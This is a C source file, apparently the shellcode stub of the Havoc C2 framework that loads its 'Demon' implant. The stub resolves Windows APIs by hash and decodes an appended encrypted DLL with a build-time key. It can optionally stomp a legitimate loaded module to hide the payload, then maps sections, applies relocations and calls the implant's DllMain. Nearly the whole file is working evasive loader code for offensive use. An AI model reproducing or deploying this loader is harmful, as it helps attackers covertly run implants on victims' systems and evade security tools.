#include <Core.h>
#include <Win32.h>
#include <Utils.h>
#include <winternl.h>

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

// debug tracing: resolves OutputDebugStringA from kernel32 at runtime.
// use DebugView (or VS Code "Run > Attach Debugger") to view the messages.
#define KERNEL32_HASH           0x6ddb9555
#define OUTPUTDEBUGSTRINGA_HASH 0x490fc1d5

typedef VOID ( WINAPI *OUTPUTDEBUGSTRINGA )( LPCSTR );

SEC( text, B ) VOID DbgTrace( UINT_PTR Kernel32, PCHAR Message )
{
    if ( Kernel32 == 0 || Kernel32 == ( UINT_PTR ) -1 )
        return;

    OUTPUTDEBUGSTRINGA pOutputDebugStringA = ( OUTPUTDEBUGSTRINGA ) LoaderFuncAdd( Kernel32, OUTPUTDEBUGSTRINGA_HASH );
    if ( pOutputDebugStringA )
        pOutputDebugStringA( Message );
}

// markers the teamserver locates & patches in the shellcode template to enable
// module stomping and set the decoy module name at build time.
#define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
#define STOMP_ENABLED_MARKER    0xA5

// marker the teamserver patches with the payload-encoding key at build time
#define CRYPT_KEY_MARKER        "HAVOC_CRYPT_KEY_MARKER"

// markers the teamserver overwrites with the template size (= appended DLL
// offset) and the compiled Demon DLL size (= decode length) respectively
#define DLL_OFFSET_MARKER       0xD11F0D11D11F0D11
#define DLL_SIZE_MARKER         0xA22E1E22A22E1E22

WCHAR   gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
BYTE    gStompEnabled                    = STOMP_ENABLED_MARKER;
CHAR    gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;
ULONG64 gDllOffset                       = DLL_OFFSET_MARKER;
ULONG64 gDllSize                         = DLL_SIZE_MARKER;

SEC( text, B ) VOID Entry( VOID )
{
    INSTANCE                Instance        = { 0 };
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID                  KVirtualMemory  = NULL;
    DWORD                   KMemSize        = 0;
    DWORD                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    PVOID                   SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };
    BOOL                    Mapped          = FALSE;

    LPVOID                  StompBase       = NULL;
    SIZE_T                  StompSize       = 0;
    PIMAGE_NT_HEADERS       StompNt         = NULL;

    // 0. Get our own base address and locate the appended Demon DLL.
    // 0. Locate the appended Demon DLL.
    //    Encoded: use GetRIP + gDllOffset (no MZ to scan for in ciphertext).
    //    Plaintext: use KaynCaller (proven MZ scan, works on all Windows versions).
    if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
    {
        ULONG_PTR stubBase = ( ULONG_PTR ) GetRIP( ) & ~( PAGE_SIZE - 1 );
        KaynLibraryLdr = C_PTR( stubBase + gDllOffset );

        // Decode BEFORE reading any PE fields — everything is ciphertext.
        // Key length = actual key chars, NOT CRYPT_KEY_LEN-1: the Go encoder
        // hashes only the key bytes, so including the NUL terminator here
        // would produce a different FNV seed and garbage output.
        SIZE_T KeyLen = 0;
        while ( KeyLen < CRYPT_KEY_LEN - 1 && gCryptKey[ KeyLen ] != 0 )
            KeyLen++;
        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, KeyLen );
    }
    else
    {
        KaynLibraryLdr = KaynCaller( );
    }

    // resolve ntdll FIRST so we can trace even if kernel32 fails
    Instance.Modules.Ntdll = LoaderModPebbb( NTDLL_HASH );

    // ultra-early trace: use NTDLL's own debug output path (DbgPrint is not
    // available, so we still need kernel32 for OutputDebugStringA — but if
    // kernel32 lookup fails we now fall through safely thanks to the guard)
    UINT_PTR Kernel32 = LoaderModPebbb( KERNEL32_HASH );
    DbgTrace( Kernel32, "[stub] Entry: starting" );
    if ( Kernel32 == 0 || Kernel32 == ( UINT_PTR ) -1 )
        DbgTrace( Kernel32, "[stub] WARNING: kernel32 not found" );

    Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
    Instance.Win32.NtAllocateVirtualMemory = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
    Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );

    DbgTrace( Kernel32, "[stub] functions resolved" );

    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;

    DbgTrace( Kernel32, "[stub] DLL located, PE headers parsed" );

    // Optional module stomping: overwrite a legitimate, already-loaded module
    // image with our payload. enabled per-build by the teamserver (gStompEnabled).
    if ( gStompEnabled == 1 )
    {
        U_STRING StompName = { 0 };
        USHORT   StompNameLen = 0;

        // compute the actual string length in WCHARs (not the buffer size)
        while ( StompNameLen < STOMP_TARGET_LEN && gStompTarget[ StompNameLen ] != 0 )
            StompNameLen++;

        StompName.Buffer        = gStompTarget;
        StompName.Length        = StompNameLen * sizeof( WCHAR );
        StompName.MaximumLength = ( USHORT )( STOMP_TARGET_LEN ) * sizeof( WCHAR );

        // explicitly clear StompBase: if both LdrGetDllHandle and LdrLoadDll
        // fail, StompBase must be NULL so we don't deref a garbage pointer
        StompBase = NULL;
        DbgTrace( Kernel32, "[stub] stomp: looking for target DLL" );
        if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
        {
            StompBase = NULL;
            DbgTrace( Kernel32, "[stub] stomp: not loaded, trying LdrLoadDll" );
            if ( ! NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase ) ) )
            {
                StompBase = NULL;
                DbgTrace( Kernel32, "[stub] stomp: LdrLoadDll FAILED" );
            }
        }

        if ( StompBase )
        {
            DbgTrace( Kernel32, "[stub] stomp: got target DLL handle" );
            StompNt   = C_PTR( StompBase + ( ( PIMAGE_DOS_HEADER ) StompBase )->e_lfanew );
            StompSize = StompNt->OptionalHeader.SizeOfImage;

            // only stomp if the target can hold the entire payload image
            if ( StompSize >= NtHeaders->OptionalHeader.SizeOfImage )
            {
                DbgTrace( Kernel32, "[stub] stomp: target size OK, using stomp base" );
                KVirtualMemory = StompBase;
                KHdrSize       = 0;
                KMemSize       = NtHeaders->OptionalHeader.SizeOfImage;
                Mapped         = TRUE;
            }
            else
            {
                DbgTrace( Kernel32, "[stub] stomp: target too small, falling back" );
            }
        }
        else
        {
            DbgTrace( Kernel32, "[stub] stomp: no target DLL, falling back" );
        }
    }

    if ( ! Mapped && NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
        Mapped = TRUE;

    if ( Mapped )
    {
        DbgTrace( Kernel32, "[stub] memory ready, copying sections" );
        // TODO: find the base address of this shellcode in a better way?
        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
        KaynArgs.DllCopy   = KaynLibraryLdr;
        KaynArgs.Demon     = KVirtualMemory;
        KaynArgs.DemonSize = KMemSize;

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            // when stomping, the destination pages are not writable: flip them first
            if ( gStompEnabled == 1 )
            {
                SecMemory     = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
                SecMemorySize = SecHeader[ i ].SizeOfRawData;

                // if protect fails, still attempt the copy — the pages may
                // already be writable, and skipping the copy leaves garbage
                Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READWRITE, &OldProtection );
            }

            MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
                SecHeader[ i ].SizeOfRawData                                        // Section Size
            );
        }

        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

        DbgTrace( Kernel32, "[stub] relocations applied, setting protections" );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            {
                Protection = PAGE_EXECUTE_READ;
                KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
                KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
            }

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // when stomping: restore protection on the PE header region only.
        // do NOT blanket-protect the whole image as PAGE_EXECUTE_READ — that
        // would make .data read-only and crash DllMain when it writes globals.
        // the per-section protections set above are already correct.
        if ( gStompEnabled == 1 )
        {
            // protect just the first section's pages (the PE headers live there)
            SecMemory     = KVirtualMemory;
            SecMemorySize = NtHeaders->OptionalHeader.SizeOfHeaders;
            if ( SecMemorySize > 0 )
                Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READONLY, &OldProtection );
        }

        // --------------------------------
        // 6. Finally executing our DllMain
        // --------------------------------
        DbgTrace( Kernel32, "[stub] calling DllMain" );
        BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
        LLDKman( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
        DbgTrace( Kernel32, "[stub] DllMain returned" );
    }
}

VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}
